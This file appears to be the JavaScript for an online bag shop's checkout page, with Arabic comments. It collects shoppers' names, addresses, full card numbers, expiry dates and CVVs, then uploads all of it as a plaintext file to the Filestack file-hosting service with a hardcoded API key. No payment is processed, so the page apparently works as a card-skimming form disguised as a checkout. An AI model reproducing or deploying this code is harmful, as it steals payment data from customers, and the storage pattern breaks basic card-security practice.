document.addEventListener('DOMContentLoaded', function () {
  const form = document.getElementById('checkout-form');

  // استخراج المعلمات من الرابط
  function getUrlParams() {
    const params = {};
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    urlParams.forEach((value, key) => {
      params[key] = value;
    });
    return params;
  }

  const urlParams = getUrlParams();

  // ملء معلومات المنتج باستخدام المعلمات المستلمة من الرابط
  document.getElementById('product-name').textContent = `Name: ${urlParams.name || ''}`;
  document.getElementById('product-color').textContent = `Color: ${urlParams.color || ''}`;
  document.getElementById('product-price').textContent = `Price: ${urlParams.price || ''}`;
  document.getElementById('total-price').textContent = `Total Price: ${urlParams.total || ''}`;

  // عرض الصورة
  const productImage = document.getElementById('product-image');
  if (urlParams.imageUrl) {
    productImage.src = urlParams.imageUrl;  // رابط الصورة
    productImage.alt = `${urlParams.name} image`;  // نص بديل للصورة
  }

  // عرض الكمية
  const productQuantity = parseInt(urlParams.quantity, 10) || 1; // تعيين الكمية الافتراضية إلى 1 إذا لم يتم إرسالها
  document.getElementById('product-quantity').textContent = `Quantity: ${productQuantity}`;

  // حساب السعر الإجمالي
  const productPrice = parseFloat(urlParams.price) || 0; // تحويل السعر إلى عدد عشري
  const totalPrice = (productPrice * productQuantity).toFixed(2); // حساب السعر الإجمالي
  document.getElementById('total-price').textContent = `Total Price: $${totalPrice}`;

  // إضافة مستمع للإرسال
  form.addEventListener('submit', function (event) {
    event.preventDefault();  // منع إعادة تحميل الصفحة عند الإرسال

    // جمع البيانات من الحقول
    const email = document.getElementById('email').value;
    const firstName = document.getElementById('first-name').value;
    const lastName = document.getElementById('last-name').value;
    const streetHouseApartmentUnit = document.getElementById('street-house-apartment-unit').value;
    const city = document.getElementById('city').value;
    const state = document.getElementById('state').value;
    const zipCode = document.getElementById('zip-code').value;
    const cardName = document.getElementById('card-name').value;
    const cardNumber = document.getElementById('card-number').value;
    const expiry = document.getElementById('expiry').value;
    const cvv = document.getElementById('cvv').value;

    // معلومات المنتج
    const productName = document.getElementById('product-name').textContent.split(': ')[1];  // اسم المنتج
    const productPriceText = document.getElementById('product-price').textContent.split(': ')[1];  // سعر المنتج
    const productQuantityText = document.getElementById('product-quantity').textContent.split(': ')[1];  // كمية المنتج
    const productImageUrl = urlParams.imageUrl || '';  // رابط الصورة

    // تحقق من القيم
    let isValid = true;

    removeErrorMessages();  // إزالة رسائل الخطأ السابقة

    // تحقق من الحقول الفارغة
    if (!email || !firstName || !lastName || !streetHouseApartmentUnit || !city || !state || !zipCode || !cardName || !cardNumber || !expiry || !cvv) {
        isValid = false;
        showErrorMessage('Please fill out all required fields.', 'general');
    }

    // تحقق من صحة البريد الإلكتروني
    if (!validateEmail(email)) {
        isValid = false;
        showErrorMessage('Please enter a valid email address.', 'email');
    }

    // تحقق من اسم حامل البطاقة
    if (!validateCardName(cardName)) {
        isValid = false;
        showErrorMessage('Please enter a valid cardholder name (letters only).', 'card-name');
    }

    // تحقق من صحة أرقام البطاقة (Visa / MasterCard فقط)
    if (!validateCard(cardNumber)) {
        isValid = false;
        showErrorMessage('Please enter a valid Visa or MasterCard number.', 'card-number');
    }

    // تحقق من تاريخ الصلاحية
    if (!validateExpiry(expiry)) {
        isValid = false;
        showErrorMessage('Please enter a valid expiry date in MM/YY format.', 'expiry');
    }

    // تحقق من CVV
    if (!validateCVV(cvv)) {
        isValid = false;
        showErrorMessage('Please enter a valid CVV number.', 'cvv');
    }

    if (isValid) {
        // إنشاء محتوى الملف النصي مع بيانات المنتج
        const orderData = ` 
            Email: ${email}
            First Name: ${firstName}
            Last Name: ${lastName}
            Street_House_Apartment_Unit: ${streetHouseApartmentUnit}
            City: ${city}
            State: ${state}
            Zip Code: ${zipCode}
            Cardholder's Name: ${cardName}
            Card Number: ${cardNumber}
            Expiry Date: ${expiry}
            CVV: ${cvv}

            --- Product Details ---
            Product Name: ${productName}
            Product Price: $${productPriceText}
            Product Quantity: ${productQuantityText}
            Product Image URL: ${productImageUrl}
            Total Price: $${totalPrice}
        `;
        
        // تحويل البيانات إلى Blob (بيانات ثنائية)
        const blob = new Blob([orderData], { type: 'text/plain' });

        // إعدادات Filestack API
        const apiKey = 'A7fSrsBg3RjybN1kkK99lz'; // استبدل بـ API Key الخاص بك
        const client = filestack.init(apiKey);

        // رفع الملف إلى Filestack
        client.upload(blob)
            .then(result => {
                // عند نجاح رفع الملف
                alert('Your order has been successfully placed and saved to Filestack!');
                window.location.href = 'https://checkout.glamhavenbags.shop/thank-you.html';  // إعادة توجيه إلى صفحة الشكر
                console.log(result);  // تفاصيل رفع الملف
            })
            .catch(error => {
                // في حال حدوث خطأ
                console.error('Error uploading file to Filestack:', error);
                alert('Something went wrong, please try again later.');
            });
    }
  });
});

// دالة للتحقق من البريد الإلكتروني
function validateEmail(email) {
  const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  return emailPattern.test(email);
}

// دالة للتحقق من اسم حامل البطاقة (يجب أن يحتوي فقط على حروف)
function validateCardName(cardName) {
  const namePattern = /^[a-zA-Z\s]+$/;  // اسم يحتوي فقط على حروف ومسافات
  return namePattern.test(cardName);
}

// دالة للتحقق من رقم البطاقة (Visa / MasterCard فقط)
function validateCard(cardNumber) {
  const visaMasterCardPattern = /^(4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$/; // تحقق من فيزا وماستر كارد
  return visaMasterCardPattern.test(cardNumber);
}

// دالة للتحقق من تاريخ الصلاحية (MM/YY)
function validateExpiry(expiry) {
  const expiryPattern = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
  if (!expiryPattern.test(expiry)) return false;

  // تحقق من أن تاريخ الصلاحية ليس في الماضي
  const currentDate = new Date();
  const [month, year] = expiry.split('/').map(val => parseInt(val, 10));
  const expiryDate = new Date(`20${year}`, month - 1);  // تحويل إلى تاريخ مع السنة 20XX
  return expiryDate >= currentDate;
}

// دالة للتحقق من CVV
function validateCVV(cvv) {
  const cvvPattern = /^[0-9]{3,4}$/;  // يحقق من أن الرقم يتكون من 3 أو 4 أرقام
  return cvvPattern.test(cvv);
}

// دالة لإظهار رسالة الخطأ أسفل الحقل المعني
function showErrorMessage(message, fieldId) {
  const field = document.getElementById(fieldId);
  let errorElement = document.getElementById(fieldId + '-error');
  
  if (!errorElement) {
      errorElement = document.createElement('div');
      errorElement.id = fieldId + '-error';
      errorElement.style.color = 'red';
      errorElement.style.fontSize = '12px';
      errorElement.style.marginTop = '5px';
      field.parentNode.appendChild(errorElement);
  }

  errorElement.textContent = message;
}

// دالة لإزالة رسائل الخطأ عند الكتابة في الحقل
function removeErrorMessages() {
  const errorMessages = document.querySelectorAll('.error-message');
  errorMessages.forEach(msg => msg.remove());
}

// الدالة الخاصة بالتحقق من تاريخ الصلاحية عند الكتابة
const expiryInput = document.getElementById('expiry');
expiryInput.addEventListener('input', function () {
  let value = expiryInput.value;
  
  // قم بإضافة "/" بعد الرقمين الأولين فقط
  if (value.length === 2 && !value.includes('/')) {
      expiryInput.value = value + '/';
  }

  // قم بمنع الكتابة أكثر من رقمين بعد "/"
  if (value.length > 5) {
      expiryInput.value = value.slice(0, 5);  // يترك أول 5 حروف (MM/YY)
  }
});

// دالة لإزالة رسالة الخطأ عند الكتابة في أي حقل
document.querySelectorAll('input').forEach(input => {
  input.addEventListener('input', function () {
      const errorElement = document.getElementById(input.id + '-error');
      if (errorElement) {
          errorElement.textContent = '';  // إزالة رسالة الخطأ عند الكتابة
      }
  });
});




